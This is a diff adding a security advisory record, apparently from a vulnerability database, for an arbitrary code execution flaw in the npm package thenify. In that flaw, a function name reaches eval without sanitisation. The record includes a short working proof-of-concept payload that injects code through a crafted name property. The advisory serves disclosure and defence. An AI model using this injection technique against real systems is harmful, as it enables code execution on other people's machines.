@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:thenify:571690
+  title: Arbitrary Code Execution
+  description: |
+    [thenify][1] is a Promisify a callback-based function using any-promise.
+
+    Affected versions of this package are vulnerable to Arbitrary Code
+    Execution. The `name` argument provided to the package can be controlled
+    by users without any sanitization, and this is provided to the `eval`
+    function without any sanitization.
+
+    ### PoC   {#poc}
+
+        var a = require("thenify");
+        var attack_code = "fs=require('fs');fs.writeFile('Song', 'test',function(){})";
+        function cur(){};
+        Object.defineProperty(cur, "name", { value: "fake() {" + attack_code + ";})();(function(){//"});
+        a(cur);
+
+
+
+    [1]: https://www.npmjs.com/package/thenify
+  affected_package: thenify
+  vulnerable_versions:
+  - "<3.3.1"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7677
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-06-15
+  created_date: 2020-06-15
+  last_modified_date: 2020-06-15
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/thenables/thenify/blob/master/index.js#L17
+  - https://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a
+  source_url: https://snyk.io/vuln/SNYK-JS-THENIFY-571690
